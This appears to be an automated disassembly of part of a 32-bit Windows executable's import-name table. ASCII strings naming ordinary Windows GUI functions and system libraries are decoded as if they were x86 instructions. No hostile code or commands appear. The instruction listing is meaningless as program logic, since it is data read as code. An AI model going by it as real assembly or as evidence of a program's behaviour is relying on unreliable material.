  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
